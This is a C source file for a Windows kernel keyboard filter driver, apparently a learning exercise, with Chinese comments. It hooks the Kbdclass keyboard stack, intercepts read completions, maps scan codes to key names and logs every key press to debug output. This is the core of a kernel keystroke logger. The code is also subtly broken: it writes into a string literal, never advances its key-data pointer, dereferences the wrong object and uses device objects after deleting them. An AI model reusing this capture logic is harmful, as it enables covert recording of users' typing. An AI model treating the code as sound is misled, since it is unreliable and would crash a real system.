#include <NTDDK.h>
#define KDB_DRIVER_NAME L"\\Driver\\Kbdclass"
#define DELAY_ONE_MILLISECOND -10
ULONG gC2pKeyCount;
NTSTATUS
ObReferenceObjectByName(
	PUNICODE_STRING ObjectName,
	ULONG Attributes,
	PACCESS_STATE PassedAccessState,
	ACCESS_MASK DesiredAccess,
	POBJECT_TYPE ObjectType,
	KPROCESSOR_MODE AccessMode,
	PVOID ParseContext,
	PVOID *Object);
extern POBJECT_TYPE IoDriverObjectType;
typedef struct _C2P_DEV_EXT
{
	ULONG NodeSize;
	PDEVICE_OBJECT pFilterDeviceObject;
	KSPIN_LOCK IoRequestspinLock;
	KEVENT IoInProgressEvent;
	PDEVICE_OBJECT TargetDeviceObject;
	PDEVICE_OBJECT LowerDeviceObject;
}C2P_DEV_EXT,*PC2P_DEV_EXT;
typedef struct _KEYBOARD_INPUT_DATA{
	USHORT UnitId;
	USHORT MakeCode;
	USHORT Flags;
	USHORT Reserved;
	ULONG ExtraInformation;
}KEYBOARD_INPUT_DATA,*PKEYBOARD_INPUT_DATA;
#include <ntddk.h>
VOID MakeCodeToASCII(USHORT MakeCode,USHORT Flags,PCHAR Ascii)//Ascii为16字节
{
	if(Flags>=2)
	{
		if(Flags==2)
		{
			switch(MakeCode)
			{
			case 0x2a:
				{
					strncpy(Ascii," ",16);
					break;
				}
			case 0x5b:
			case 0x5c:
				{
					strncpy(Ascii,"Windows按下",16);
					break;
				}
			case 0x48:
				{
					strncpy(Ascii,"Up按下",16);
					break;
				}
			case 0x50:
				{
					strncpy(Ascii,"Down按下",16);
					break;
				}
			case 0x4b:
				{
					strncpy(Ascii,"Left按下",16);
					break;
				}
			case 0x4d:
				{
					strncpy(Ascii,"Right按下",16);
					break;
				}
			case 0x53:
				{
					strncpy(Ascii,"Del按下",16);
					break;
				}
			default:
				{
					strncpy(Ascii,"Error",16);
					break;
				}
			}
		}
		if(Flags==3)
		{
			switch(MakeCode)
			{
			case 0x2a:
				{
					strncpy(Ascii," ",16);
					break;
				}
			case 0x5b:
			case 0x5c:
				{
					strncpy(Ascii,"Windows弹起",16);
					break;
				}
			case 0x48:
				{
					strncpy(Ascii,"Up弹起",16);
					break;
				}
			case 0x50:
				{
					strncpy(Ascii,"Down弹起",16);
					break;
				}
			case 0x4b:
				{
					strncpy(Ascii,"Left弹起",16);
					break;
				}
			case 0x4d:
				{
					strncpy(Ascii,"Right弹起",16);
					break;
				}
			case 0x53:
				{
					strncpy(Ascii,"Del弹起",16);
					break;
				}
			default:
				{
					strncpy(Ascii,"Error",16);
					break;
				}
			}
		}
		return;
	}
	switch(MakeCode)
	{
	case 0x1d:
		{
			strncpy(Ascii,"Ctrl",12);
			break;
		}
	case 0x1c:
		{
			strncpy(Ascii,"Enter",12);
			break;
		}
	case 0x3a:
		{
			strncpy(Ascii,"CapsLock",12);
			break;
		}
	case 0x2a:
	case 0x36:
		{
			strncpy(Ascii,"Shift",12);
			break;
		}
	case 0x02:
		{
			strncpy(Ascii,"1",12);
			break;
		}
	case 0x4f:
		{
			strncpy(Ascii,"Num1",12);
			break;
		}
	case 0x03:
		{
			strncpy(Ascii,"2",12);
			break;
		}
	case 0x50:
		{
			strncpy(Ascii,"Num2",12);
			break;
		}
	case 0x04:
		{
			strncpy(Ascii,"3",12);
			break;
		}
	case 0x51:
		{
			strncpy(Ascii,"Num3",12);
			break;
		}
	case 0x05:
		{
			strncpy(Ascii,"4",12);
			break;
		}
	case 0x4b:
		{
			strncpy(Ascii,"Num4",12);
			break;
		}
	case 0x06:
		{
			strncpy(Ascii,"5",12);
			break;
		}
	case 0x4c:
		{
			strncpy(Ascii,"Num5",12);
			break;
		}
	case 0x07:
		{
			strncpy(Ascii,"6",12);
			break;
		}
	case 0x4d:
		{
			strncpy(Ascii,"Num6",12);
			break;
		}
	case 0x08:
		{
			strncpy(Ascii,"7",12);
			break;
		}
	case 0x47:
		{
			strncpy(Ascii,"Num7",12);
			break;
		}
	case 0x09:
		{
			strncpy(Ascii,"8",12);
			break;
		}
	case 0x48:
		{
			strncpy(Ascii,"Num8",12);
			break;
		}
	case 0x0a:
		{
			strncpy(Ascii,"9",12);
			break;
		}
	case 0x49:
		{
			strncpy(Ascii,"Num9",12);
			break;
		}
	case 0x0b:
		{
			strncpy(Ascii,"0",12);
			break;
		}
	case 0x52:
		{
			strncpy(Ascii,"Num0",12);
			break;
		}
	case 0x1e:
		{
			strncpy(Ascii,"a",12);
			break;
		}
	case 0x30:
		{
			strncpy(Ascii,"b",12);
			break;
		}
	case 0x2e:
		{
			strncpy(Ascii,"c",12);
			break;
		}
	case 0x20:
		{
			strncpy(Ascii,"d",12);
			break;
		}
	case 0x12:
		{
			strncpy(Ascii,"e",12);
			break;
		}
	case 0x21:
		{
			strncpy(Ascii,"f",12);
			break;
		}
	case 0x22:
		{
			strncpy(Ascii,"g",12);
			break;
		}
	case 0x23:
		{
			strncpy(Ascii,"h",12);
			break;
		}
	case 0x17:
		{
			strncpy(Ascii,"i",12);
			break;
		}
	case 0x24:
		{
			strncpy(Ascii,"j",12);
			break;
		}
	case 0x25:
		{
			strncpy(Ascii,"k",12);
			break;
		}
	case 0x26:
		{
			strncpy(Ascii,"l",12);
			break;
		}
	case 0x32:
		{
			strncpy(Ascii,"m",12);
			break;
		}
	case 0x31:
		{
			strncpy(Ascii,"n",12);
			break;
		}
	case 0x18:
		{
			strncpy(Ascii,"o",12);
			break;
		}
	case 0x19:
		{
			strncpy(Ascii,"p",12);
			break;
		}
	case 0x10:
		{
			strncpy(Ascii,"q",12);
			break;
		}
	case 0x13:
		{
			strncpy(Ascii,"r",12);
			break;
		}
	case 0x1f:
		{
			strncpy(Ascii,"s",12);
			break;
		}
	case 0x14:
		{
			strncpy(Ascii,"t",12);
			break;
		}
	case 0x16:
		{
			strncpy(Ascii,"u",12);
			break;
		}
	case 0x2f:
		{
			strncpy(Ascii,"v",12);
			break;
		}
	case 0x11:
		{
			strncpy(Ascii,"w",12);
			break;
		}
	case 0x2d:
		{
			strncpy(Ascii,"x",12);
			break;
		}
	case 0x15:
		{
			strncpy(Ascii,"y",12);
			break;
		}
	case 0x2c:
		{
			strncpy(Ascii,"z",12);
			break;
		}
	case 0x39:
		{
			strncpy(Ascii,"Space",12);
			break;
		}
	case 0x0e:
		{
			strncpy(Ascii,"BackSpace",12);
			break;
		}
	case 0x0f:
		{
			strncpy(Ascii,"Tab",12);
			break;
		}
	case 0x45:
		{
			strncpy(Ascii,"NumLock",12);
			break;
		}
	case 0x33:
		{
			strncpy(Ascii,",",12);
			break;
		}
	case 0x34:
		{
			strncpy(Ascii,".",12);
			break;
		}
	case 0x35:
		{
			strncpy(Ascii,"/",12);
			break;
		}
	case 0x27:
		{
			strncpy(Ascii,";",12);
			break;
		}
	case 0x28:
		{
			strncpy(Ascii,"'",12);
			break;
		}
	case 0x1a:
		{
			strncpy(Ascii,"[",12);
			break;
		}
	case 0x1b:
		{
			strncpy(Ascii,"]",12);
			break;
		}
	case 0x2b:
		{
			strncpy(Ascii,"\\",12);
			break;
		}
	case 0x0c:
		{
			strncpy(Ascii,"-",12);
			break;
		}
	case 0x0d:
		{
			strncpy(Ascii,"=",12);
			break;
		}
	default:
		{
			strncpy(Ascii,"Error",12);
			return;
		}
	}
	if(Flags==0)
	{
		strncat(Ascii,"按下",4);
	}
	else
	{
		strncat(Ascii,"弹起",4);
	}
	return;
}
VOID DriverUnload(PDRIVER_OBJECT driver)
{
	PC2P_DEV_EXT devExt;
	PDEVICE_OBJECT DeviceObject;
	LARGE_INTEGER lDelay;
	PRKTHREAD CurrentThread;
	lDelay=RtlConvertLongToLargeInteger(100*DELAY_ONE_MILLISECOND);
	CurrentThread=KeGetCurrentThread();
	KeSetPriorityThread(CurrentThread,LOW_REALTIME_PRIORITY);
	UNREFERENCED_PARAMETER(driver);
	DeviceObject=driver->DeviceObject;
	while(DeviceObject)
	{
		devExt=(PC2P_DEV_EXT)(DeviceObject->DeviceExtension);
		IoDetachDevice(devExt->LowerDeviceObject);
		IoDeleteDevice(DeviceObject);
		DeviceObject=DeviceObject->NextDevice;
	}
	ASSERT(NULL==driver->DeviceObject);
	while(gC2pKeyCount)
	{
		KeDelayExecutionThread(KernelMode,FALSE,&lDelay);
	}
	DbgPrint("键盘过滤驱动:驱动关闭");
	return;
}
NTSTATUS kbDispatchGeneral(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
	DbgPrint("键盘过滤驱动:其他信息");
	IoSkipCurrentIrpStackLocation(Irp);
	return IoCallDriver(((PC2P_DEV_EXT)DeviceObject->DeviceExtension)->LowerDeviceObject,Irp);
}
NTSTATUS kbpower(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
	PC2P_DEV_EXT devExt;
	PoStartNextPowerIrp(Irp);
	IoSkipCurrentIrpStackLocation(Irp);
	devExt=(PC2P_DEV_EXT)DeviceObject->DeviceExtension;
	return PoCallDriver(devExt->LowerDeviceObject,Irp);
}
NTSTATUS kbpnp(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
	NTSTATUS status=STATUS_SUCCESS;
	PC2P_DEV_EXT devExt;
	PIO_STACK_LOCATION irpstack;
	devExt=(PC2P_DEV_EXT)(DeviceObject->DeviceExtension);
	irpstack=IoGetCurrentIrpStackLocation(Irp);
	switch(irpstack->MinorFunction)
	{
	case IRP_MN_REMOVE_DEVICE:
		{
			DbgPrint("键盘过滤驱动:有一个USB键盘退出了(PNP请求)");
			IoSkipCurrentIrpStackLocation(Irp);
			IoCallDriver(devExt->LowerDeviceObject,Irp);
			IoDetachDevice(devExt->LowerDeviceObject);
			IoDeleteDevice(DeviceObject);
			status=STATUS_SUCCESS;
			break;
		}
	default:
		{
			IoSkipCurrentIrpStackLocation(Irp);
			status=IoCallDriver(devExt->LowerDeviceObject,Irp);
			break;
		}
	}
	return status;
}
NTSTATUS kbReadComplete(PDEVICE_OBJECT DeviceObject,PIRP Irp,PVOID Context)
{
	PIO_STACK_LOCATION stackirp;
	ULONG buf_len=0;
	ULONG i;
	PKEYBOARD_INPUT_DATA KeyData;
	PCHAR Ascii="1234567890123456";
	stackirp=IoGetCurrentIrpStackLocation(Irp);
	if(NT_SUCCESS(Irp->IoStatus.Status))
	{
		buf_len=Irp->IoStatus.Information/sizeof(KEYBOARD_INPUT_DATA);
		KeyData=Irp->AssociatedIrp.SystemBuffer;
		for(i=0;i<buf_len;i++)
		{
			MakeCodeToASCII(KeyData->MakeCode,KeyData->Flags,Ascii);
			//DbgPrint("键盘过滤驱动:键盘扫描码-%2x%s",KeyData->MakeCode,KeyData->Flags?"弹起":"按下");
			DbgPrint("键盘过滤驱动:%s",Ascii);
		}
	}
	gC2pKeyCount--;
	if(Irp->PendingReturned)
	{
		IoMarkIrpPending(Irp);
	}
	return Irp->IoStatus.Status;
}
NTSTATUS kbread(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
	NTSTATUS status=STATUS_SUCCESS;
	PC2P_DEV_EXT devExt;
	PIO_STACK_LOCATION currentirpstack;
	KEVENT waitEvent;
	KeInitializeEvent(&waitEvent,NotificationEvent,FALSE);
	if(Irp->CurrentLocation==1)
	{
		DbgPrint("键盘过滤驱动:捕获驱动遇到了虚假的当前位置");
		status=STATUS_INVALID_DEVICE_REQUEST;
		Irp->IoStatus.Status=status;
		Irp->IoStatus.Information=0;
		IoCompleteRequest(Irp,IO_NO_INCREMENT);
		return status;
	}
	gC2pKeyCount++;
	devExt=(PC2P_DEV_EXT)(DeviceObject->DeviceExtension);
	currentirpstack=IoGetCurrentIrpStackLocation(Irp);
	IoCopyCurrentIrpStackLocationToNext(Irp);
	IoSetCompletionRoutine(Irp,kbReadComplete,DeviceObject,TRUE,TRUE,TRUE);
	return IoCallDriver(devExt->LowerDeviceObject,Irp);
}
NTSTATUS DriverEntry(PDRIVER_OBJECT driver,PUNICODE_STRING RegistryPath)
{
	ULONG i;
	UNICODE_STRING kbdname;
	NTSTATUS status;
	PDRIVER_OBJECT kbddriver=NULL;
	PC2P_DEV_EXT devExt;
	
	PDEVICE_OBJECT pFilterDriver=NULL;//过滤驱动
	PDEVICE_OBJECT pTargetDriver=NULL;//目标驱动
	PDEVICE_OBJECT pLowerDriver=NULL;//下方驱动

	DbgPrint("键盘过滤驱动:驱动开启");
	
	
	
	gC2pKeyCount=0;
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	{
		driver->MajorFunction[i]=kbDispatchGeneral;
	}
	driver->MajorFunction[IRP_MJ_READ]=kbread;
	driver->MajorFunction[IRP_MJ_POWER]=kbpower;
	driver->MajorFunction[IRP_MJ_PNP]=kbpnp;
	driver->DriverUnload=DriverUnload;
	RtlInitUnicodeString(&kbdname,KDB_DRIVER_NAME);
	status=ObReferenceObjectByName(&kbdname,OBJ_CASE_INSENSITIVE,NULL,FILE_ALL_ACCESS,IoDriverObjectType,KernelMode,NULL,&kbddriver);
	if(!NT_SUCCESS(status))
	{
		DbgPrint("键盘过滤驱动:ObReferenceObjectByName函数返回错误");
		return(status);
	}
	else
	{
		ObDereferenceObject(driver);
	}

	pTargetDriver=kbddriver->DeviceObject;
	while(pTargetDriver)
	{
		status=IoCreateDevice(driver,sizeof(C2P_DEV_EXT),NULL,pTargetDriver->DeviceType,pTargetDriver->Characteristics,FALSE,&pFilterDriver);
		if(!NT_SUCCESS(status))
		{
			DbgPrint("键盘过滤驱动:创建过滤设备失败");
			return status;
		}
		pLowerDriver=IoAttachDeviceToDeviceStack(pFilterDriver,pTargetDriver);
		if(!pLowerDriver)
		{
			DbgPrint("键盘过滤驱动:绑定设备失败");
			IoDeleteDevice(pFilterDriver);
			pFilterDriver=NULL;
			return status;
		}
		devExt=(PC2P_DEV_EXT)(pFilterDriver->DeviceExtension);
		memset(devExt,0,sizeof(C2P_DEV_EXT));
		devExt->NodeSize=sizeof(C2P_DEV_EXT);
		//KeInitializeSpinLock(详情参见windows自旋锁系列函数
		KeInitializeSpinLock(&(devExt->IoRequestspinLock));
		KeInitializeEvent(&(devExt->IoInProgressEvent),NotificationEvent,FALSE);
		devExt->TargetDeviceObject=pTargetDriver;
		devExt->LowerDeviceObject=pLowerDriver;
		pFilterDriver->DeviceType=pLowerDriver->DeviceType;
		pFilterDriver->Characteristics=pLowerDriver->Characteristics;
		pFilterDriver->StackSize=pLowerDriver->StackSize+1;
		pFilterDriver->Flags|=pLowerDriver->Flags&(DO_BUFFERED_IO|DO_DIRECT_IO|DO_POWER_PAGABLE);
		pTargetDriver=pTargetDriver->NextDevice;
	}
	
	return STATUS_SUCCESS;
}